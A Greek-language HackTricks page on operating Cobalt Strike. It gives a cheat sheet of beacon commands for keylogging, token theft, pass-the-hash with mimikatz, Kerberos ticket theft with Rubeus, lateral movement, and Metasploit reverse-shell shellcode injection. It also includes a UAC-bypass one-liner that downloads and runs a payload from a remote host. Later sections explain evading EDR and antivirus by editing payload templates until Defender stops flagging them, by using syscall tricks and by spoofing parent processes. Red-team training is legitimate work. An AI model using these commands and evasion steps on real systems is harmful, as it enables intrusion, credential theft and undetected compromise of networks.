# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` και μετά μπορείτε να επιλέξετε πού θα ακούει, τι είδους beacon θα χρησιμοποιηθεί (http, dns, smb...) και άλλα.

### Peer2Peer Listeners

Τα beacon αυτών των listeners δεν χρειάζεται να επικοινωνούν απευθείας με το C2· μπορούν να επικοινωνούν μαζί του μέσω άλλων beacon.

`Cobalt Strike -> Listeners -> Add/Edit` και μετά πρέπει να επιλέξετε τα TCP ή SMB beacon

* Το **TCP beacon θα ορίσει έναν listener στην επιλεγμένη θύρα**. Για να συνδεθείτε σε ένα TCP beacon, χρησιμοποιήστε την εντολή `connect <ip> <port>` από ένα άλλο beacon
* Το **SMB beacon θα ακούει σε ένα pipename με το επιλεγμένο όνομα**. Για να συνδεθείτε σε ένα SMB beacon, χρησιμοποιήστε την εντολή `link [target] [pipe]`.

### Δημιουργία και φιλοξενία payloads

#### Δημιουργία payloads σε αρχεία

`Attacks -> Packages ->`

* **`HTMLApplication`** για αρχεία HTA
* **`MS Office Macro`** για έγγραφο Office με macro
* **`Windows Executable`** για αρχείο .exe, .dll ή service .exe
* **`Windows Executable (S)`** για **stageless** .exe, .dll ή service .exe (προτιμήστε stageless αντί για staged, καθώς έχει λιγότερα IoCs)

#### Δημιουργία και φιλοξενία payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Αυτό θα δημιουργήσει ένα script/εκτελέσιμο αρχείο για τη λήψη του beacon από το Cobalt Strike, σε μορφές όπως: bitsadmin, exe, powershell και python

#### Φιλοξενία payloads

Αν έχετε ήδη το αρχείο που θέλετε να φιλοξενήσετε σε έναν web server, μεταβείτε στο `Attacks -> Web Drive-by -> Host File` και επιλέξτε το αρχείο προς φιλοξενία και τη ρύθμιση παραμέτρων του web server.

### Επιλογές Beacon

<details>
<summary>Επιλογές και εντολές Beacon</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Custom implants / Linux Beacons

- Ένας custom agent χρειάζεται μόνο να μιλά το πρωτόκολλο HTTP/S του Cobalt Strike Team Server (προεπιλεγμένο malleable C2 profile) για να εγγράφεται/επικοινωνεί και να λαμβάνει tasks. Υλοποιήστε τα ίδια URIs/headers/metadata crypto που ορίζονται στο profile, ώστε να επαναχρησιμοποιήσετε το Cobalt Strike UI για tasking και output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Ένα Aggressor Script (π.χ., `CustomBeacon.cna`) μπορεί να ενσωματώσει τη δημιουργία payload για το non-Windows beacon, ώστε οι operators να επιλέγουν τον listener και να παράγουν ELF payloads απευθείας από το GUI.
- Παραδείγματα Linux task handlers που εκτίθενται στο Team Server: `sleep`, `cd`, `pwd`, `shell` (εκτέλεση αυθαίρετων εντολών), `ls`, `upload`, `download` και `exit`. Αντιστοιχούν στα task IDs που αναμένει το Team Server και πρέπει να υλοποιηθούν στην πλευρά του server, ώστε να επιστρέφουν output στη σωστή μορφή.
- Η υποστήριξη BOF σε Linux μπορεί να προστεθεί φορτώνοντας Beacon Object Files in-process με το [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (υποστηρίζει και BOFs τύπου Outflank), επιτρέποντας την εκτέλεση modular post-exploitation στο context/με τα privileges του implant, χωρίς δημιουργία νέων processes.<sup>[[2]](#references)[[3]](#references)</sup>
  Για επιφυλάξεις σχετικά με τις μορφές loader και τα όρια των processes στο Linux, μαζί με ξεχωριστό παράδειγμα BOF tasking, δείτε το [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries).
- Ενσωματώστε έναν SOCKS handler στο custom beacon, ώστε να διατηρείται η δυνατότητα pivoting αντίστοιχη με αυτή των Windows Beacons: όταν ο operator εκτελεί `socks <port>`, το implant θα πρέπει να ανοίγει έναν τοπικό proxy για τη δρομολόγηση των εργαλείων του operator μέσω του παραβιασμένου Linux host προς εσωτερικά δίκτυα.

## Opsec

### Execute-Assembly

Το **`execute-assembly`** χρησιμοποιεί μια **sacrificial process** και remote process injection για να εκτελέσει το υποδεικνυόμενο πρόγραμμα. Αυτό είναι πολύ θορυβώδες, καθώς για την εισαγωγή κώδικα σε μια process χρησιμοποιούνται συγκεκριμένα Win APIs, τα οποία ελέγχονται από κάθε EDR. Ωστόσο, υπάρχουν ορισμένα custom εργαλεία που μπορούν να φορτώσουν κάτι στην ίδια process:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Στο Cobalt Strike μπορείτε επίσης να χρησιμοποιήσετε BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Το agressor script `https://github.com/outflanknl/HelpColor` δημιουργεί την εντολή `helpx` στο Cobalt Strike, η οποία προσθέτει χρώματα στις εντολές υποδεικνύοντας αν είναι BOFs (πράσινο), Frok&Run (κίτρινο) ή ProcessExecution, injection κ.λπ. (κόκκινο). Αυτό βοηθά να γνωρίζετε ποιες εντολές είναι πιο stealthy.

### Σύγχρονο in-process post-execution

Οι πρόσφατες εκδόσεις προσθέτουν δύο εναλλακτικές λύσεις όταν ένα κλασικό COFF BOF έχει πολλούς περιορισμούς:

- Το **Beacon Interpreter** μεταγλωττίζει C στον Team Server σε ενδιάμεσο bytecode και τον εκτελεί σε VM ενσωματωμένο στο Beacon. Το bytecode παραμένει δεδομένα και όχι native εκτελέσιμος κώδικας, αποφεύγοντας έτσι την πρόσθετη εκχώρηση εκτελέσιμης μνήμης και τη μετάβαση δικαιωμάτων από RW σε RX που συνήθως απαιτούνται για τη φόρτωση ενός BOF. Τα scripts μπορούν να εισάγουν το Beacon API και να δηλώνουν prototypes Dynamic Function Resolution (DFR) τύπου BOF.
- Το **BOF-PE** φορτώνει ένα πλήρες EXE ή DLL στο τρέχον Beacon. Αυτή η μορφή υποστηρίζει κανονικά PE imports, exception handling, πιο σύνθετο C++ και εξωτερικές βιβλιοθήκες, διατηρώντας παράλληλα το Beacon API. Είναι πιο βαρύ από ένα μικρό COFF BOF, γι’ αυτό επιλέξτε το μόνο όταν είναι χρήσιμο το πρόσθετο runtime.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Αυτοί οι μηχανισμοί μειώνουν τα σήματα που σχετίζονται με τον loader, όχι την τηλεμετρία που παράγεται από τις ενέργειες του script ή τις κλήσεις Windows API.<sup>[[8]](#references)</sup>

### Ενεργήστε ως ο χρήστης

Μπορείτε να ελέγξετε συμβάντα όπως `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`: 

- Security EID 4624 - Ελέγξτε όλες τις διαδραστικές συνδέσεις για να μάθετε τις συνήθεις ώρες λειτουργίας.
- System EID 12,13 - Ελέγξτε τη συχνότητα τερματισμού λειτουργίας/εκκίνησης/αναστολής λειτουργίας.
- Security EID 4624/4625 - Ελέγξτε τις εισερχόμενες έγκυρες/μη έγκυρες προσπάθειες NTLM.
- Security EID 4648 - Αυτό το συμβάν δημιουργείται όταν χρησιμοποιούνται διαπιστευτήρια σε μορφή απλού κειμένου για σύνδεση. Αν το δημιούργησε μια διεργασία, το binary ενδέχεται να περιέχει τα διαπιστευτήρια σε απλό κείμενο, σε αρχείο ρυθμίσεων ή μέσα στον κώδικα.

Όταν χρησιμοποιείτε `jump` από το Cobalt Strike, είναι προτιμότερο να χρησιμοποιείτε τη μέθοδο `wmi_msbuild`, ώστε η νέα διεργασία να φαίνεται πιο νόμιμη.

### Χρησιμοποιήστε λογαριασμούς υπολογιστών

Είναι σύνηθες οι defenders να ελέγχουν ύποπτες συμπεριφορές που προέρχονται από χρήστες και να **εξαιρούν από την παρακολούθησή τους λογαριασμούς υπηρεσιών και λογαριασμούς υπολογιστών, όπως αυτούς που τελειώνουν σε `*$`**. Θα μπορούσατε να χρησιμοποιήσετε αυτούς τους λογαριασμούς για πλευρική μετακίνηση ή κλιμάκωση προνομίων.

### Χρησιμοποιήστε stageless payloads

Τα stageless payloads είναι λιγότερο θορυβώδη από τα staged, επειδή δεν χρειάζεται να κατεβάσουν δεύτερο stage από τον C2 server. Αυτό σημαίνει ότι δεν παράγουν κίνηση δικτύου μετά την αρχική σύνδεση και, επομένως, είναι λιγότερο πιθανό να εντοπιστούν από άμυνες που βασίζονται στο δίκτυο.

### Tokens & Token Store

Να είστε προσεκτικοί όταν κλέβετε ή δημιουργείτε tokens, επειδή ένα EDR μπορεί να απαριθμήσει τα thread tokens και να εντοπίσει **token που ανήκει σε διαφορετικό χρήστη** ή ακόμα και στο SYSTEM μέσα στη διεργασία.

Έτσι μπορείτε να αποθηκεύετε tokens **ανά beacon**, ώστε να μη χρειάζεται να κλέβετε ξανά και ξανά το ίδιο token. Αυτό είναι χρήσιμο για πλευρική μετακίνηση ή όταν χρειάζεται να χρησιμοποιήσετε πολλές φορές ένα κλεμμένο token:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Κατά την πλευρική μετακίνηση, συνήθως είναι προτιμότερο να **κλέβετε ένα token αντί να δημιουργείτε καινούργιο** ή να εκτελείτε επίθεση pass the hash.

### Guardrails

Το Cobalt Strike διαθέτει μια λειτουργία που ονομάζεται **Guardrails** και συμβάλλει στην αποτροπή της χρήσης συγκεκριμένων εντολών ή ενεργειών που θα μπορούσαν να εντοπιστούν από defenders. Τα Guardrails μπορούν να ρυθμιστούν ώστε να αποκλείουν συγκεκριμένες εντολές, όπως `make_token`, `jump`, `remote-exec` και άλλες που χρησιμοποιούνται συχνά για πλευρική μετακίνηση ή κλιμάκωση προνομίων.

Επιπλέον, το repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) περιέχει επίσης ελέγχους και ιδέες που μπορείτε να λάβετε υπόψη πριν από την εκτέλεση ενός payload.

### Κρυπτογράφηση tickets

Σε ένα AD, προσέξτε την κρυπτογράφηση των tickets. Από προεπιλογή, ορισμένα εργαλεία χρησιμοποιούν κρυπτογράφηση RC4 για τα Kerberos tickets, η οποία είναι λιγότερο ασφαλής από την κρυπτογράφηση AES. Τα ενημερωμένα περιβάλλοντα χρησιμοποιούν από προεπιλογή AES. Αυτό μπορεί να εντοπιστεί από defenders που παρακολουθούν τη χρήση αδύναμων αλγορίθμων κρυπτογράφησης.

### Αποφύγετε τις προεπιλογές

Όταν χρησιμοποιείτε το Cobalt Strike, τα SMB pipes ονομάζονται από προεπιλογή `msagent_####` και `"status_####`. Αλλάξτε αυτά τα ονόματα. Μπορείτε να ελέγξετε τα ονόματα των υπαρχόντων pipes από το Cobalt Strike με την εντολή: `ls \\.\pipe\`

Επιπλέον, στις SSH sessions δημιουργείται ένα pipe με το όνομα `\\.\pipe\postex_ssh_####`. Αλλάξτε το με την εντολή `set ssh_pipename "<new_name>";`.

Επίσης, στην επίθεση post-exploitation, τα pipes `\\.\pipe\postex_####` μπορούν να τροποποιηθούν με την εντολή `set pipename "<new_name>"`.

Στα Cobalt Strike profiles μπορείτε επίσης να τροποποιήσετε στοιχεία όπως:

- Να αποφεύγετε τη χρήση του `rwx`
- Τον τρόπο λειτουργίας του process injection (ποιες APIs θα χρησιμοποιούνται) στο block `process-inject {...}`
- Τον τρόπο λειτουργίας του "fork and run" στο block `post-ex {…}`
- Τον χρόνο αναστολής λειτουργίας
- Το μέγιστο μέγεθος των binaries που φορτώνονται στη μνήμη
- Το αποτύπωμα μνήμης και το περιεχόμενο των DLL με το block `stage {...}`
- Την κίνηση δικτύου

### Sleepmask και BeaconGate

Ένα Sleepmask μετασχηματίζει το Beacon και τις δεσμεύσεις heap που παρακολουθεί όσο παραμένει ανενεργό και, στη συνέχεια, τα επαναφέρει για την εκτέλεση εργασιών. Οι τρέχουσες εκδόσεις παρέχουν μια προεπιλεγμένη ρύθμιση με χαρακτηριστικά αποφυγής εντοπισμού, αλλά τα προσαρμοσμένα Sleepmask BOFs παραμένουν χρήσιμα όταν διαφέρουν οι απαιτήσεις για τη διάταξη μνήμης, τις δεσμεύσεις μνήμης ή τη στοίβα κλήσεων. Από την έκδοση 4.13, το προεπιλεγμένο Sleepmask παραποιεί επίσης τη διεύθυνση επιστροφής για APIs που καλούνται μέσω του BeaconGate.<sup>[[8]](#references)</sup>

Το **BeaconGate** επεκτείνει αυτή τη σχεδίαση πέρα από το `Sleep`: οι επιλεγμένες κλήσεις WinAPI αναπαρίστανται ως δομές `FUNCTION_CALL` και προωθούνται στο Sleepmask BOF, το οποίο μπορεί να αποκρύπτει το Beacon κατά την εκτέλεση της κλήσης. Το profile μπορεί να ενεργοποιεί μια ομάδα (`Comms`, `Core`, `Cleanup` ή `All`) ή μόνο μεμονωμένα APIs:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

Για ένα API που αναφέρεται στο `beacon_gate`, το gate έχει προτεραιότητα έναντι του `syscall_method`. Τα API που δεν αναφέρονται εκεί μπορούν και πάλι να χρησιμοποιούν την ρυθμισμένη syscall method. Οι εντολές `beacon_gate disable` και `beacon_gate enable` απενεργοποιούν και ενεργοποιούν αντίστοιχα τη λειτουργία κατά την εκτέλεση. Αποφύγετε να ενεργοποιείτε απερίσκεπτα το `All`: εντολές όπως η `ps` καλούν επανειλημμένα τα `OpenProcess`/`CloseHandle` και μπορούν να προκαλέσουν αιχμή στη χρήση CPU όταν κάθε κλήση κάνει mask και unmask το Beacon. Το Sleepmask-VS παρέχει mocked κατάσταση Beacon/Sleepmask για τον εντοπισμό σφαλμάτων σε custom gates, χωρίς να χρειάζεται να τα δοκιμάζετε επανειλημμένα μέσω ενός live implant.<sup>[[9]](#references)</sup>

### Θορυβώδη proc injections

Η εισαγωγή κώδικα σε μια διεργασία είναι συνήθως πολύ θορυβώδης, επειδή **καμία συνηθισμένη διεργασία δεν εκτελεί συνήθως αυτή την ενέργεια και οι τρόποι για να γίνει είναι πολύ περιορισμένοι**. Επομένως, θα μπορούσε να εντοπιστεί από συστήματα ανίχνευσης βάσει συμπεριφοράς. Επιπλέον, θα μπορούσε επίσης να εντοπιστεί από EDR που σαρώνουν τη μνήμη για **threads που περιέχουν κώδικα ο οποίος δεν υπάρχει στον δίσκο** (αν και αυτό είναι συνηθισμένο σε διεργασίες όπως οι browsers που χρησιμοποιούν JIT). Παράδειγμα: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | Σχέσεις PID και PPID

Κατά τη δημιουργία μιας νέας διεργασίας, είναι σημαντικό να **διατηρείται μια συνηθισμένη σχέση γονέα-παιδιού** μεταξύ των διεργασιών, ώστε να αποφεύγεται ο εντοπισμός. Αν το svchost.exec εκτελεί το iexplorer.exe, θα φαίνεται ύποπτο, καθώς το svchost.exe δεν είναι γονική διεργασία του iexplorer.exe σε ένα συνηθισμένο περιβάλλον Windows.

Όταν δημιουργείται ένα νέο beacon στο Cobalt Strike, από προεπιλογή δημιουργείται μια διεργασία που χρησιμοποιεί το **`rundll32.exe`** για την εκτέλεση του νέου listener. Αυτό δεν είναι ιδιαίτερα stealthy και μπορεί να εντοπιστεί εύκολα από EDR. Επιπλέον, το `rundll32.exe` εκτελείται χωρίς ορίσματα, γεγονός που το κάνει ακόμη πιο ύποπτο.

Με την ακόλουθη εντολή του Cobalt Strike, μπορείτε να ορίσετε διαφορετική διεργασία για τη δημιουργία του νέου beacon, ώστε να είναι δυσκολότερος ο εντοπισμός του:

```bash
spawnto x86 svchost.exe
```

Μπορείτε επίσης να αλλάξετε αυτήν τη ρύθμιση **`spawnto_x86` και `spawnto_x64`** σε ένα profile.

### Proxying της κίνησης των επιτιθέμενων

Οι επιτιθέμενοι μερικές φορές χρειάζεται να μπορούν να εκτελούν εργαλεία τοπικά, ακόμη και σε μηχανήματα Linux, και να δρομολογούν την κίνηση των θυμάτων προς το εργαλείο (π.χ. NTLM relay).

Επιπλέον, μερικές φορές, για μια επίθεση pass-the.hash ή pass-the-ticket, είναι πιο stealthy για τον επιτιθέμενο να **προσθέσει αυτό το hash ή ticket στη δική του διεργασία LSASS** τοπικά και στη συνέχεια να κάνει pivot από εκεί, αντί να τροποποιήσει τη διεργασία LSASS ενός μηχανήματος-θύματος.

Ωστόσο, πρέπει να είστε **προσεκτικοί με την κίνηση που παράγεται**, καθώς μπορεί να στέλνετε ασυνήθιστη κίνηση (kerberos;) από τη διεργασία backdoor. Για αυτό, θα μπορούσατε να κάνετε pivot σε μια διεργασία browser (αν και μπορεί να σας εντοπίσουν κατά την εισαγωγή κώδικα στη διεργασία, οπότε σκεφτείτε έναν stealthy τρόπο να το κάνετε).


### Αποφυγή AV

#### AV/AMSI/ETW Bypass

Δείτε τη σελίδα:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Συνήθως, στο `/opt/cobaltstrike/artifact-kit` μπορείτε να βρείτε τον κώδικα και τα προμεταγλωττισμένα templates (στο `/src-common`) των payloads που θα χρησιμοποιήσει το cobalt strike για να δημιουργήσει τα binary beacons.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με το backdoor που δημιουργήθηκε (ή απλώς με το μεταγλωττισμένο template), μπορείτε να βρείτε τι κάνει το defender να ενεργοποιείται. Συνήθως πρόκειται για ένα string. Επομένως, μπορείτε απλώς να τροποποιήσετε τον κώδικα που δημιουργεί το backdoor, ώστε αυτό το string να μην εμφανίζεται στο τελικό binary.

Αφού τροποποιήσετε τον κώδικα, απλώς εκτελέστε το `./build.sh` από τον ίδιο κατάλογο και αντιγράψτε τον φάκελο `dist-pipe/` στον Windows client, στη διαδρομή `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Μην ξεχάσετε να φορτώσετε το επιθετικό script `dist-pipe\artifact.cna`, ώστε να υποδείξετε στο Cobalt Strike να χρησιμοποιεί τους πόρους από τον δίσκο που θέλουμε και όχι αυτούς που έχουν ήδη φορτωθεί.

#### Resource Kit

Ο φάκελος ResourceKit περιέχει τα πρότυπα για τα payloads του Cobalt Strike που βασίζονται σε scripts, όπως PowerShell, VBA και HTA.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με τα πρότυπα, μπορείτε να εντοπίσετε τι δεν αρέσει στο Defender (το AMSI, σε αυτήν την περίπτωση) και να το τροποποιήσετε:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Τροποποιώντας τις γραμμές που εντοπίστηκαν, μπορείτε να δημιουργήσετε ένα template που δεν θα εντοπιστεί.

Μην ξεχάσετε να φορτώσετε το aggressive script `ResourceKit\resources.cna`, ώστε να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

#### Function hooks | Syscall

Το function hooking είναι μια πολύ συνηθισμένη μέθοδος που χρησιμοποιούν τα EDR για τον εντοπισμό κακόβουλης δραστηριότητας. Το Cobalt Strike σάς επιτρέπει να παρακάμψετε αυτά τα hooks χρησιμοποιώντας **syscalls** αντί για τις τυπικές κλήσεις του Windows API με τη ρύθμιση **`None`**, χρησιμοποιώντας την έκδοση `Nt*` μιας συνάρτησης με τη ρύθμιση **`Direct`** ή απλώς κάνοντας jump πάνω από τη συνάρτηση `Nt*` με την επιλογή **`Indirect`** στο malleable profile. Ανάλογα με το σύστημα, μια επιλογή μπορεί να είναι πιο stealth από κάποια άλλη.

Αυτό μπορεί να οριστεί στο profile ή χρησιμοποιώντας την εντολή **`syscall-method`**.

Ωστόσο, αυτό μπορεί επίσης να είναι θορυβώδες.

Μια επιλογή που προσφέρει το Cobalt Strike για την παράκαμψη των function hooks είναι η αφαίρεσή τους με το [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Μπορείτε επίσης να ελέγξετε ποιες συναρτήσεις έχουν hooks με τα [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ή [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Διάφορες εντολές του Cobalt Strike</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (προσαρμοσμένο implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF πρότυπο](https://github.com/outflanknl/nix_bof_template)
- [4] [Ανάλυση του Unit42 για την κρυπτογράφηση μεταδεδομένων του Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Ημερολόγιο του SANS ISC για την κίνηση του Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Χαμένοι στη μετάφραση](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Μέσα από το BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
